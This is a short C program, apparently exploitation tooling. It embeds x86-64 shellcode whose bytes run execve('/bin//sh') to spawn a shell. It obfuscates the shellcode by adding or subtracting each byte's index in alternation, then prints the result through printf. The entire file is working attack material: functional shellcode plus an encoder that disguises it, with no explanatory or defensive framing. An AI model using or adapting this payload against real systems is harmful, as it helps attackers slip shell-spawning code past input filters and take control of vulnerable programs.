#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";

int main(){
    int i;
    int v3;
    for (i = 0; strlen(shellcode) > i; i++){
        if ( (i & 1) != 0 ){
            v3 = -1;
        } else{
            v3 = 1;
        }
        shellcode[i] -= v3 * i;
    }
    printf(shellcode);
    
}